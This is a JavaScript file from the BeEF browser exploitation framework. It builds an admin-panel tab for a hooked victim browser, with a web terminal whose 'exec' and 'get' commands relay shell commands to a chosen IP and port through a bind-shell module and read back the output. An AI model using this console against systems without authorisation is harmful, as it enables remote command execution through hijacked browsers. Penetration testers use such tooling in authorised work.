//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*
 * The Ipec Tab panel for the selected zombie.
 */

ZombieTab_IpecTab = function(zombie) {

	var commands_statusbar = new Beef_StatusBar('ipec-bbar-zombie-'+zombie.session);

     var req_pagesize = 30;

    var ipec_config_panel = new Ext.Panel({
		id: 'ipec-config-zombie-'+zombie.session,
		title: 'Scan Config',
		layout: 'fit',
        autoscroll: true
	});

    function get_rest_token(){
        var token = "";
        var url = "/ui/modules/getRestfulApiToken.json";
        $jwterm.ajax({
            contentType: 'application/json',
            dataType: 'json',
            type: 'GET',
            url: url,
            async: false,
            processData: false,
            success: function(data){
                token = data.token;
                console.log(token);
            },
            error: function(){
                console.log("Error getting RESTful API token");
            }
        });
        return token;
    }

    function get_module_id(name, token){
        var id = "";
        var url = "/api/modules/search/" + name + "?token=" + token;
        $jwterm.ajax({
            contentType: 'application/json',
            dataType: 'json',
            type: 'GET',
            url: url,
            async: false,
            processData: false,
            success: function(data){
                id = data.id;
            },
            error: function(){
                console.log("Error getting module id.");
            }
        });
        return id;
    }


    function escape_html(str) {
        str = str.toString();
        str = str.replace(/</g, '&lt;');
        str = str.replace(/>/g, '&gt;');
//        str = str.replace(/\u0022/g, '&quot;');
        str = str.replace(/\u0027/g, '&#39;');
        str = str.replace(/\"\"/g, '');
        str = str.replace(/\\r/g, '');
        str = str.replace(/\\n/g, '<br>');
        str = str.replace(/\\\\/g, '\\');
        str = str.replace(/\\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;');
//        str = str.replace(/\\/g, '&#92;');
        return str;
    }


    function initTerminal(zombie){
        String.prototype.reverse = function() {
            return this.split('').reverse().join('');
        };

        $jwterm( document ).ready( function() {
            $jwterm('#wterm').wterm( { WIDTH: '100%', HEIGHT: '100%', WELCOME_MESSAGE: 'Welcome to BeEF Bind interactive shell. To Begin Using type \'help\'' });
        });

        var target_ip = "";
        var target_port = "";

        var command_directory = {
            'eval': function( tokens ) {
                tokens.shift();
                var expression = tokens.join( ' ' );
                var result = '';
                try {
                    result = eval( expression );
                } catch( e ) {
                    result = 'Error: ' + e.message;
                }
                return result;
            },

            'date': function( tokens ) {
                var now = new Date();
                return now.getDate() + '-' +
                    now.getMonth() + '-' +
                    ( 1900 + now.getYear() )
            },

            'cap': function( tokens ) {
                tokens.shift();
                return tokens.join( ' ' ).toUpperCase();
            },

            'go': function( tokens ) {
                var url = tokens[1];
                document.location.href = url;
            },

            'target': function(tokens){
                target_ip = tokens[1];
                target_port = tokens[2];
                return "Target is now " + tokens[1] + ":" + tokens[2];
            },


            'exec': function(tokens){
                if(target_ip.length == 0 || target_port.length == 0)
                   return "Error: target ip or port not set."

                tokens.shift(); //remove the first element (exec)
                var cmd = tokens.join(' '); //needed in case of commands with options
                cmd = cmd.replace(/\\/g, '\\\\'); //needed to prevent JS errors (\ need to be escaped)

                var token = get_rest_token();
                var mod_id = get_module_id("BeEF_bind_shell", token);

                var uri = "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token;

                var result = null;

                $jwterm.ajax({
                    contentType: 'application/json',
                    data: JSON.stringify({"rhost":target_ip, "rport":target_port, "path":"/", "cmd":cmd}),
                    dataType: 'json',
                    type: 'POST',
                    url: uri,
                    async: false,
                    processData: false,
                    success: function(data){
                        console.log("data: " + data.command_id);
                        result = "Command [" + data.command_id + "] sent successfully";
                    },
                    error: function(){
                        console.log("Error sending command");
                        return "Error sending command";
                    }
                });

                return result;
            },

            'get': function(tokens){
                var command_id = tokens[1];

                if(command_id != null){

                    var token = get_rest_token();
                    var mod_id = get_module_id("BeEF_bind_shell", token);

                    var uri_results = "/api/modules/" + zombie.session + "/" + mod_id + "/"
                        + command_id + "?token=" + token;
                    var results = "";
                    $jwterm.ajax({
                        contentType: 'application/json',
                        dataType: 'json',
                        type: 'GET',
                        url: uri_results,
                        async: false,
                        processData: false,
                        success: function(data){
                            $jwterm.each(data, function(i){
                                console.log("result [" + i +"]: " + $jwterm.parseJSON(data[i].data).data);
                                results += $jwterm.parseJSON(data[i].data).data;
                            });

                        },
                        error: function(){
                            console.log("Error sending command");
                            return "Error sending command";
                        }
                    });
                    results = escape_html(results);
                    if(results.charAt(0) == '"' && results.charAt(results.length-1) == '"')
                         results = results.slice(1,results.length-1);

                    return results;
                }
            },

            'strrev': {
                PS1: 'strrev $',

                EXIT_HOOK: function() {
                    return 'exit interface commands';
                },

                START_HOOK: function() {
                    return 'exit interface commands';
                },

                DISPATCH: function( tokens ) {
                    return tokens.join('').reverse();
                }
            }
        };

        for( var j in command_directory ) {
            $jwterm.register_command( j, command_directory[j] );
        }

        $jwterm.register_command( 'help', function() {
            return 'target - Usage: target &lt;IP&gt; &lt;port&gt; - Send commands to the specified IP:port<br>' +
                   'exec - Usage exec &lt;command&gt; &lt;command options&gt;  - Exec a command, returns the command id.<br>' +
                   'get - Usage get &lt;command id&gt; - Retrieve command results given a specified command id.<br>'

        });
    };


    var ipec_terminal_panel = new Ext.Panel({
        id: 'ipec-terminal-zombie-'+zombie.session,
        title: 'Terminal',
        layout: 'fit',
        padding: '1 1 1 1',
        autoScroll: true,
        html: "<style>body { background: #000; font-size: 1em;}</style><div id='wterm'></div>",
        listeners: {
            afterrender : function(){
                initTerminal(zombie);
            }
        }

    });

     var ipec_logs_store = new Ext.ux.data.PagingJsonStore({
        storeId: 'ipec-logs-store-zombie-' + zombie.session,
        url: '/ui/ipec/zombie.json',
        remoteSort: false,
        autoDestroy: true,
        autoLoad: false,
        root: 'logs',

        fields: ['id', 'vector_method', 'vector_name', 'vector_poc'],
        sortInfo: {field: 'id', direction: 'DESC'},

        baseParams: {
            nonce: Ext.get("nonce").dom.value,
            zombie_session: zombie.session
        }
    });

    var ipec_logs_bbar = new Ext.PagingToolbar({
        pageSize: req_pagesize,
        store: ipec_logs_store,
        displayInfo: true,
        displayMsg: 'Displaying history {0} - {1} of {2}',
        emptyMsg: 'No history to display'
    });

    var ipec_logs_grid = new Ext.grid.GridPanel({
        id: 'ipec-logs-grid-zombie-' + zombie.session,
        store: ipec_logs_store,
        bbar: ipec_logs_bbar,
        border: false,
        loadMask: {msg:'Loading History...'},

        viewConfig: {
            forceFit:true
        },

        view: new Ext.grid.GridView({
            forceFit: true,
            emptyText: "No History",
            enableRowBody:true
        }),

        columns: [
            {header: 'Id', width: 10, sortable: true, dataIndex: 'id', hidden:true},
            {header: 'Vector Method', width: 30, sortable: true, dataIndex: 'vector_method', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
            {header: 'Vector Name', width: 40, sortable: true, dataIndex: 'vector_name', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}},
            {header: 'Vector PoC', sortable: true, dataIndex: 'vector_poc', renderer: function(value){return $jEncoder.encoder.encodeForHTML(value)}}
        ],

        listeners: {
            afterrender: function(datagrid) {
                datagrid.store.reload({params:{start:0,limit:req_pagesize, sort: "date", dir:"DESC"}});
            }
        }
    });

    var ipec_logs_panel = new Ext.Panel({
		id: 'ipec-logs-panel-zombie-'+zombie.session,
		title: 'Logs',
		items:[ipec_logs_grid],
		layout: 'fit',

		listeners: {
			activate: function(ipec_logs_panel) {
				ipec_logs_panel.items.items[0].store.reload();
			}
		}
	});

    function genScanSettingsPanel(zombie, bar, value) {

		panel = Ext.getCmp('ipec-config-zombie-'+zombie.session);
		panel.setTitle('Prompt');
        panel.add(ipec_terminal_panel);
//		panel.add(form);
	}

	ZombieTab_IpecTab.superclass.constructor.call(this, {
        id: 'ipec-log-tab-'+zombie.session,
		title: 'Ipec',
		activeTab: 0,
		viewConfig: {
			forceFit: true,
			type: 'fit',
            autoScroll:true
        },
        items: [ipec_config_panel],
        bbar: commands_statusbar,
        listeners: {
			afterrender : function(){
				genScanSettingsPanel(zombie, commands_statusbar);
			},
        autoScroll:true

        }
	});
};

Ext.extend(ZombieTab_IpecTab, Ext.TabPanel, {} );